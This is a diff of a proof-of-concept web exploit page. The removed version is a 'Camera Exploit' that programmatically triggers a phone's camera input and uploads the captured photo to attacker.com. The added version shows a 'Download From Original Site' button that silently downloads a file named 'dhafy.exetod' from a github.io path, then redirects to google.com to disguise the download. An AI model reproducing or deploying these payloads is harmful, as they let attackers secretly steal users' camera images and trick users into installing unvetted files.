@@ -1,90 +1,43 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html>
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Skalasi PoC - Camera Exploit</title>
-    <style>
-        body { font-family: Arial, sans-serif; padding: 20px; }
-        h1 { margin: 1em; }
-        #capture-btn { 
-            font-size: 18px; 
-            padding: 15px 30px; 
-            background-color: #007bff; 
-            color: white; 
-            border-radius: 5px; 
-            text-align: center; 
-            cursor: pointer; 
-        }
-        #image-container {
-            margin-top: 20px;
-            display: none;
-        }
-        #captured-image {
-            width: 100%;
-            height: auto;
-            max-width: 500px;
-        }
-        #result-text {
-            color: green;
-            font-size: 18px;
-            font-weight: bold;
-        }
-    </style>
+  <meta charset="utf-8">
+  <style>
+    .button {
+      background-color: #4CAF50;
+      border: none;
+      color: white;
+      padding: 15px 32px;
+      text-align: center;
+      font-size: 16px;
+      margin: 4px 2px;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
-    <h1>Camera Exploit PoC (Skalasi)</h1>
-    <p>Click the button below to trigger camera access exploit via Google tab redirection.</p>
-    
-    <div id="capture-btn">Tap to open camera</div>
-    
-    <div id="image-container">
-        <p id="result-text">Captured Image from Camera:</p>
-        <img id="captured-image" src="" alt="Captured image will appear here">
-    </div>
 
-    <input id="fileSelect" type="file" accept="image/*" capture="camera" style="display:none;" />
-    
-    <script>
-        // Step 1: Click button triggers camera redirection through google
-        document.getElementById('capture-btn').onclick = () => {
-            window.open("https://google.com", "_blank");  // open Google in new tab
-            setTimeout(() => {
-                document.getElementById('fileSelect').click();  // triggers camera
-            }, 1000);  // 1 second delay before triggering camera
+<script>
+function a() {
 
-            // Simulate another 1 second delay before allowing file input action
-            setTimeout(() => {
-                document.getElementById('fileSelect').click();
-            }, 2000); // 2 second delay after google tab opens
-        };
+  // Trigger download terlebih dahulu
+  var link = document.createElement('a');
+  link.href = 'https://ecdnts-del.github.io/test-apk/dhafy.exetod';
+  link.download = 'dhafy.exetod';
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
 
-        // Step 2: Handle camera file capture and display the image
-        document.getElementById('fileSelect').onchange = (event) => {
-            const file = event.target.files[0];
-            if (file) {
-                const img = document.getElementById('captured-image');
-                img.src = URL.createObjectURL(file);
-                
-                // Show the image container after capture
-                document.getElementById('image-container').style.display = "block";
-                
-                // Optionally upload the captured image to an external server for further misuse
-                const formData = new FormData();
-                formData.append('file', file);
+  // Redirect setelah download mulai (delay kecil)
+  setTimeout(function () {
+    window.location.href = "https://google.com";
+  }, 320); // 0.8 detik
+}
+</script>
 
-                fetch('http://attacker.com/upload', {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => response.text())
-                .then(result => {
-                    console.log('Upload success:', result);
-                })
-                .catch(error => {
-                    console.error('Upload failed:', error);
-                });
-            }
-        };
-    </script>
+<center>
+  <input type="button" class="button" value="Download From Original Site" onclick="a()">
+</center>
+
 </body>
 </html>
